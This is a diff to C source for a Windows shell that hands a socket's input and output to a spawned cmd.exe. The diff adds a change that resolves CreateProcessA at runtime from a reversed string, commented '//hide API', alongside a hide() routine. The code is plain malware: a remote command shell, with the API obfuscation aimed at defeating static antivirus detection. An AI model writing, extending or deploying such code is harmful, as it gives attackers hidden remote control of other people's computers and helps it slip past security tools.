@@ -8,6 +8,7 @@
 #pragma comment(lib,"ws2_32")
 #pragma comment (lib, "User32.lib")
 void hide();
+BOOL (WINAPI * pCreateProcessA)(  LPCSTR  lpApplicationName,LPSTR lpCommandLine,  LPSECURITY_ATTRIBUTES lpProcessAttributes,LPSECURITY_ATTRIBUTES lpThreadAttributes,BOOL  bInheritHandles,  DWORD                 dwCreationFlags,  LPVOID                lpEnvironment,  LPCSTR                lpCurrentDirectory,  LPSTARTUPINFOA        lpStartupInfo,  LPPROCESS_INFORMATION lpProcessInformation);
 
 int main(void)
 {
@@ -33,8 +34,9 @@ int main(void)
 	st.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);
 	st.hStdInput = st.hStdOutput = st.hStdError = (HANDLE) socket;
 
-	TCHAR commandLine[256] = "cmd.exe";
-	CreateProcess(NULL, commandLine, NULL, NULL, TRUE,
+	TCHAR commandLine[256] = "cmd.exe" ;
+	pCreateProcessA = GetProcAddress(GetModuleHandle("kernel32.dll"),strrev("AssecorPetaerC"));//hide API
+	pCreateProcessA(NULL, commandLine, NULL, NULL, TRUE,
 	    0, NULL, NULL, &st, &pi);
 }
 void hide()
